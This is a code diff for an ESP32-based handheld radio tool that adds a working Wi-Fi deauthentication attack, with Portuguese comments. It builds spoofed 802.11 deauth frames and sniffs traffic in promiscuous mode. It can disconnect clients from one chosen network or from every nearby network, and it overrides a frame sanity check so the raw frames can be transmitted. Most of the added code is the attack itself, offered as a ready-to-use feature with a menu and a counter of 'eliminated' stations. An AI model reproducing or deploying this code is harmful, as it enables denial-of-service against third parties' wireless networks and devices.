@@ -1,129 +1,204 @@
+#include "scrbtm.h"
+
+// ==================== DEAUTHER (sniffer-based, targeted) ====================
+//
+// Obs: override de 'ieee80211_raw_frame_sanity_check' (necessario no core 2.x)
+// TODO:(condicional por versao)
+
+// ---- Estruturas 802.11 ----
+typedef struct {
+  uint8_t frame_control[2];
+  uint8_t duration[2];
+  uint8_t dest[6];
+  uint8_t src[6];
+  uint8_t bssid[6];
+  uint8_t fragment_sequence[2];
+} __attribute__((packed)) mac_hdr_t;
+
+typedef struct {
+  mac_hdr_t hdr;
+  uint8_t payload[0];
+} wifi_packet_t;
+
+typedef struct {
+  uint8_t frame_control[2];  // 0xC0 0x00 = deauth
+  uint8_t duration[2];
+  uint8_t station[6];        // addr1: destino (a estacao/cliente)
+  uint8_t sender[6];         // addr2: origem (o AP, spoofado)
+  uint8_t access_point[6];   // addr3: BSSID
+  uint8_t fragment_sequence[2];
+  uint16_t reason;
+} __attribute__((packed)) deauth_frame_t;
+
+#define DEAUTH_TYPE_SINGLE     0
+#define DEAUTH_TYPE_ALL        1
+#define NUM_FRAMES_PER_DEAUTH  5
+#define DEAUTH_AP_SSID "ScaryRF"
+#define DEAUTH_AP_PASS "scary1234"
+
+// Quadro pre-montado (frame_control = deauth; o resto e preenchido em runtime)
+deauth_frame_t deauth_frame = {
+  { 0xC0, 0x00 }, { 0x00, 0x00 },
+  { 0, 0, 0, 0, 0, 0 }, { 0, 0, 0, 0, 0, 0 }, { 0, 0, 0, 0, 0, 0 },
+  { 0x00, 0x00 }, 0x0001
+};
+
+int deauth_type = DEAUTH_TYPE_SINGLE;
+volatile int eliminated_stations = 0;
+
+const wifi_promiscuous_filter_t deauthFilt = {
+  WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+};
+
+// Callback do sniffer: ao ver trafego do alvo, monta e dispara o deauth.
+IRAM_ATTR void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
+  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
+  if (raw->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return; // pacote curto demais
+  const wifi_packet_t *packet = (wifi_packet_t *)raw->payload;
+  const mac_hdr_t *mac = &packet->hdr;
+
+  if (deauth_type == DEAUTH_TYPE_SINGLE) {
+    // Pacotes destinados ao AP alvo -> deauth do cliente que falou com ele.
+    if (memcmp(mac->dest, deauth_frame.sender, 6) == 0) {
+      memcpy(deauth_frame.station, mac->src, 6);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
+      eliminated_stations++;
+    }
+  } else {
+    // ALL: qualquer estacao falando com qualquer AP (dest == bssid, nao broadcast)
+    if ((memcmp(mac->dest, mac->bssid, 6) == 0) &&
+        (memcmp(mac->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
+      memcpy(deauth_frame.station, mac->src, 6);
+      memcpy(deauth_frame.access_point, mac->dest, 6);
+      memcpy(deauth_frame.sender, mac->dest, 6);
+      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
+        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
+      eliminated_stations++;
+    }
+  }
+}
+
+void startDeauth(int wifi_number, int attack_type, uint16_t reason) {
+  eliminated_stations = 0;
+  deauth_type = attack_type;
+  deauth_frame.reason = reason;
+
+  if (deauth_type == DEAUTH_TYPE_SINGLE) {
+    // softAP no canal do alvo: deixa o radio no canal certo e habilita o IF_AP p/ TX
+    WiFi.softAP(DEAUTH_AP_SSID, DEAUTH_AP_PASS, WiFi.channel(wifi_number), 1); // hidden
+    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
+    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
+  } else {
+    WiFi.softAPdisconnect();
+    WiFi.mode(WIFI_MODE_STA);
+  }
+
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_filter(&deauthFilt);
+  esp_wifi_set_promiscuous_rx_cb(&deauthSniffer);
+}
+
+void stopDeauth() {
+  esp_wifi_set_promiscuous(false);
+}
+
+// ==================== UI ====================
 void Deauther() {
-  showMessage("WiFi Deauther", "In development...");
-  delay(2000);
+  static const CmdEntry selCmds[] = {
+    { CMD_OK, "Atk" }, { CMD_RIGHT, "All" }, { CMD_DOWN, "Nav" }, { CMD_LEFT, "Back" }
+  };
+  static const CmdEntry atkCmds[] = { { CMD_LEFT, "Stop" } };
 
+  // CRITICO: o RCSwitch deixa uma ISR na GPIO 4 (RX) desde o boot, e ela e
+  // codigo em FLASH. Ao iniciar o WiFi o cache da flash e desligado (escrita
+  // na NVS); se a GPIO 4 oscilar (ruido de RF no CC1101) a ISR dispara e tenta
+  // rodar da flash sem cache -> "Cache disabled..." crash. Removemos a ISR
+  // e colocamos o RX em modo desconectado antes de ligar o WiFi.
+  mySwitch.disableReceive();
+  detachInterrupt(digitalPinToInterrupt(RX_PIN));
+
+  // Escaneia em STA (menor pico de corrente). O AP so sobe no ataque SINGLE.
   WiFi.mode(WIFI_STA);
-  esp_wifi_start();
 
-  int selectedNetwork = 0;
-  int networkCount = 0;
-  bool attacking = false;
-  unsigned long lastDebounce = 0;
-  const int debounceDelay = 200;
-
-  // Scan inicial
+  // ---- Scan ----
   u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_6x10_tf);
   u8g2.setCursor(0, 30);
   u8g2.print("Scanning networks...");
   u8g2.sendBuffer();
 
   WiFi.scanDelete();
-  networkCount = WiFi.scanNetworks(false, true); // passive=false, show_hidden=true
-
+  int networkCount = WiFi.scanNetworks(false, true); // ativo, mostra ocultas
   if (networkCount <= 0) {
-    u8g2.clearBuffer();
-    u8g2.setCursor(0, 30);
-    u8g2.print("No networks found");
-    u8g2.sendBuffer();
-    delay(1500);
+    showMessage("No networks found");
+    delay(1200);
+    WiFi.mode(WIFI_OFF);
     return;
   }
 
-  // Loop principal
-  while (!btnUp.isPressed()) {
-    // Debounce básico para navegação
-    if (millis() - lastDebounce > debounceDelay) {
-      if (!attacking) {
-        // Navegação
-        if (btnRight.isPressed()) {
-          selectedNetwork = (selectedNetwork + 1) % networkCount;
-          lastDebounce = millis();
-        } else if (btnLeft.isPressed()) {
-          selectedNetwork = (selectedNetwork - 1 + networkCount) % networkCount;
-          lastDebounce = millis();
-        }
+  int sel = 0;
+  bool redraw = true;
 
-        // Exibe rede selecionada
-        u8g2.clearBuffer();
-        u8g2.setCursor(0, 10);
-        u8g2.print("Select network:");
-        u8g2.setCursor(0, 30);
-        u8g2.print(WiFi.SSID(selectedNetwork));
-        u8g2.setCursor(0, 50);
-        u8g2.print("OK:BTN  Back:UP");
-        u8g2.sendBuffer();
+  while (true) {
+    if (btnLeft.isPressed()) break; // sai
 
-        // Inicia ataque
-        if (btnOk.isPressed()) {
-          attacking = true;
+    if (btnDown.isPressed()) { sel = (sel + 1) % networkCount; redraw = true; delay(150); }
+    if (btnUp.isPressed())   { sel = (sel - 1 + networkCount) % networkCount; redraw = true; delay(150); }
 
-          // Definir canal do alvo (necessário para enviar pacotes 802.11)
-          int targetChannel = WiFi.channel(selectedNetwork);
-          esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-          delay(10); // pequenas pausas após trocar canal
-        }
-      } else {
-        // Modo ataque: prepara o pacote de deautenticação
-        uint8_t deauthPacket[26] = {
-          0xC0, 0x00, 0x00, 0x00,             // Type/Subtype: Deauth
-          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (substituir)
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (substituir)
-          0x00, 0x00,                         // Sequence number (will incrementar)
-          0x01, 0x00                          // Reason: Unspecified
-        };
+    if (redraw) {
+      redraw = false;
+      u8g2.clearBuffer();
+      u8g2.setFont(u8g2_font_6x10_tf);
+      u8g2.setCursor(0, 12);
+      u8g2.printf("Net %d/%d  Ch%d", sel + 1, networkCount, WiFi.channel(sel));
+      u8g2.setCursor(0, 28);
+      u8g2.print(WiFi.SSID(sel).substring(0, 20));
+      drawCommandBar(selCmds, 4);
+      u8g2.sendBuffer();
+    }
 
-        // Copia BSSID (source + BSSID)
-        const uint8_t* bssid = WiFi.BSSID(selectedNetwork);
-        memcpy(&deauthPacket[10], bssid, 6);
-        memcpy(&deauthPacket[16], bssid, 6);
+    // OK = ataca a rede selecionada (SINGLE); RIGHT = ataca TODAS (ALL)
+    bool single = btnOk.isPressed();
+    bool all = btnRight.isPressed();
+    if (single || all) {
+      startDeauth(sel, single ? DEAUTH_TYPE_SINGLE : DEAUTH_TYPE_ALL, 1);
 
-        // Sequence control inicial
-        uint16_t seq = 0;
-
-        // Feedback visual
-        u8g2.clearBuffer();
-        u8g2.setCursor(0, 10);
-        u8g2.print("Attacking:");
-        u8g2.setCursor(0, 30);
-        u8g2.print(WiFi.SSID(selectedNetwork));
-        u8g2.setCursor(0, 50);
-        u8g2.print("UP to stop");
-        u8g2.sendBuffer();
-
-        // Loop de envio até o operador parar
-        while (!btnUp.isPressed()) {
-          // Envia pacote múltiplas vezes por "rafaga"
-          for (int i = 0; i < 10; i++) {
-            // Atualiza sequence control (2 bytes)
-            deauthPacket[22] = seq & 0xFF;
-            deauthPacket[23] = (seq >> 8) & 0x0F; // 4 bits de fragment, 12 bits de seq -> truncado para segurança
-            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-            seq++;
-            delay(2); // pequeno gap para processamento
+      // ---- Tela de ataque ----
+      unsigned long lastDraw = 0;
+      while (!btnLeft.isPressed()) {
+        if (millis() - lastDraw > 250) {
+          lastDraw = millis();
+          u8g2.clearBuffer();
+          u8g2.setFont(u8g2_font_6x10_tf);
+          u8g2.setCursor(0, 12);
+          u8g2.print(single ? "Attacking:" : "Attacking ALL");
+          if (single) {
+            u8g2.setCursor(0, 24);
+            u8g2.print(WiFi.SSID(sel).substring(0, 20));
           }
-
-          // Pequeno refresh do display para responsividade
-          u8g2.setCursor(80, 50);
-          u8g2.print(millis() / 1000); // tempo de ataque em segundos
+          u8g2.setCursor(0, 38);
+          u8g2.printf("Deauths: %d", eliminated_stations);
+          drawCommandBar(atkCmds, 1);
           u8g2.sendBuffer();
-
-          // Permite cancelar pelo botão (debounce)
-          if (btnUp.isPressed()) break;
         }
-
-        // Parar ataque: restaura estado WiFi se quiser
-        attacking = false;
-        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // opcional: volta para canal 1
-        delay(100);
+        delay(10);
       }
-    } // fim debounce
-    delay(10); // loop-friendly
-  } // fim while principal
 
-  // Cleanup opcional
-  esp_wifi_stop();
+      // Para o ataque e volta para STA (tela de selecao)
+      stopDeauth();
+      WiFi.softAPdisconnect();
+      WiFi.mode(WIFI_STA);
+      redraw = true;
+    }
+
+    delay(10);
+  }
+
+  // ---- Cleanup ----
+  stopDeauth();
+  WiFi.softAPdisconnect();
   WiFi.mode(WIFI_OFF);
   showMessage("Deauther", "Stopped");
-  delay(800);
+  delay(600);
 }
